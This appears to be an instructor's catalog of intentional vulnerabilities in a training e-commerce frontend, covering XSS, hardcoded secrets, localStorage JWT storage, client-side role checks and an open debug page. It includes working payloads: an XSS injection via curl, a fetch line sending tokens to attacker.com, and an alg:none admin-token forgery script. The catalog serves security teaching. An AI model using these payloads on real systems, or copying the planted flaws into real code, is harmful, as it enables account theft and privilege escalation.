# ShopWorthy Frontend — Vulnerability Catalog

> **Instructor-facing document.** Documents every intentional vulnerability in the `frontend` repository.

---

## VULN-FE-001 — DOM XSS via Product Descriptions and Reviews

| Field | Detail |
|-------|--------|
| **ID** | VULN-FE-001 |
| **Type** | Cross-Site Scripting (XSS) |
| **OWASP** | A03:2021 – Injection |
| **Severity** | High |
| **File** | `src/pages/ProductDetailPage.tsx` ~line 42, `src/components/ReviewSection.tsx` ~line 27 |

### Description
Product descriptions are rendered using `dangerouslySetInnerHTML`. Review comments are also rendered without sanitization. Since product descriptions can be set via the admin panel or API, an attacker can inject arbitrary JavaScript.

### Exploitation Steps
1. Login as admin or exploit mass assignment to gain write access
2. Update a product description via:
```bash
curl -X PUT -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"description":"<img src=x onerror=alert(document.cookie)>"}' \
  http://localhost:4000/api/products/1
```
3. Visit `/products/1` in the browser — the injected script executes

---

## VULN-FE-002 — Hardcoded API Keys and Secrets

| Field | Detail |
|-------|--------|
| **ID** | VULN-FE-002 |
| **Type** | Sensitive Data Exposure |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Severity** | High |
| **File** | `src/config.ts` |

### Description
API keys and an internal API secret are hardcoded in the frontend source code. These are bundled into the JavaScript served to every browser visitor, and are also committed to the repository.

### Values Exposed
```typescript
ANALYTICS_KEY: 'GA-SHOPWORTHY-PROD-4f8a2b1c'
PAYMENT_PUBLIC_KEY: 'pk_live_shopworthy_abc123'
INTERNAL_API_SECRET: 'sw-internal-2024-secret'
```

### Exploitation Steps
1. Open browser DevTools → Sources → search for `INTERNAL_API_SECRET`
2. Or view the built JS bundle: `curl http://localhost:3000/assets/*.js | grep -o 'sw-internal.*'`

---

## VULN-FE-003 — Insecure Token Storage (JWT in localStorage)

| Field | Detail |
|-------|--------|
| **ID** | VULN-FE-003 |
| **Type** | Broken Authentication |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | Medium |
| **File** | `src/context/AuthContext.tsx` ~line 40 |

### Description
The JWT is stored in `localStorage` instead of an `httpOnly` cookie. Any JavaScript running on the page can read this token, making it susceptible to theft via XSS.

### Exploitation Steps
1. Inject XSS (via VULN-FE-001 or VULN-ADM-003)
2. Read the token from a victim's browser:
```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('sw_token'))
```

---

## VULN-FE-004 — Client-Side Authorization Bypass

| Field | Detail |
|-------|--------|
| **ID** | VULN-FE-004 |
| **Type** | Broken Access Control |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Severity** | High |
| **File** | `src/context/AuthContext.tsx` ~line 50, `src/pages/AccountPage.tsx` ~line 12 |

### Description
Admin UI elements are shown or hidden based on a client-side JWT decode. The `role` field in the JWT payload is trusted without server verification. Forge a token with `alg:none` (VULN-API-004) and set `role: "admin"` to reveal admin functionality in the UI.

### Exploitation Steps
```python
import base64, json
header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.b64encode(json.dumps({"id":1,"role":"admin","username":"hacker"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
# Set in browser: localStorage.setItem('sw_token', token)
# Reload the page — admin link appears in the navbar
```

---

## VULN-FE-005 — Exposed Debug Endpoint

| Field | Detail |
|-------|--------|
| **ID** | VULN-FE-005 |
| **Type** | Security Misconfiguration |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Severity** | Medium |
| **File** | `src/pages/DebugPage.tsx`, `src/App.tsx` (route `/debug`) |

### Description
The `/debug` route is accessible without authentication and displays the full application config (including `INTERNAL_API_SECRET`), the current user's JWT, and all localStorage contents.

### Exploitation Steps
1. Navigate to `http://localhost:3000/debug` (no login required)
2. All secrets from `config.ts`, the auth token, and localStorage are displayed in plaintext
